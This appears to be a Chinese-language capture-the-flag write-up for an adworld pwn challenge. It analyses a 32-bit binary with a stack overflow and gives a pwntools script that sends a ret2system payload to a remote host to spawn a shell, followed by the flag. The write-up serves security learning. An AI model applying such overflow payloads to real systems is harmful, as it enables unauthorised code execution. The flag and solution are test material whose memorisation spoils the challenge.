https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055&page=1

# 分析

1. checksec查看，简要分析为栈溢出。

   ```
     Arch:     i386-32-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x8048000)
   ```

2. IDA32打开文件查看，字符串窗口发现/bin/sh，地址为0x084A024。

   ![image-20210807212511452](C:\my_ctf_learning\writeup\MISC\攻防世界\images\image-20210807212511452.png)

3. 函数窗口发现callsystem函数，地址为0x08048320

   ![image-20210807212652309](C:\my_ctf_learning\writeup\MISC\攻防世界\images\image-20210807212652309.png)

4. 输入函数，buf长度为0x88，buf后面长度为0x4

   ```
   ssize_t vulnerable_function()
   {
     char buf; // [esp+0h] [ebp-88h]
   
     system("echo Input:");
     return read(0, &buf, 0x100u);
   }
   ```

   

![image-20210807213054247](C:\my_ctf_learning\writeup\MISC\攻防世界\images\image-20210807213054247.png)

5. python脚本：

   ```
   from pwn import *
   
   payload = b'a'*0x88 + b'a' * 4 + p32(0x08048320) + p32(0) + p32(0x0804A024)
   print(payload)
   
   io = remote('111.200.241.244',60946)
   io.send(payload)
   io.interactive()
   ```

   **在32位程序运行中，函数参数直接压入栈中，调用函数时栈的结构为：调用函数地址 --- 函数返回的地址 -- 参数n -- 参数n-1 -- ... -- 参数1**，**函数的返回地址一般为0**

6. 得到flag： cyberpeace{9eea7a444d61f6a7788acc8f4cf64513}

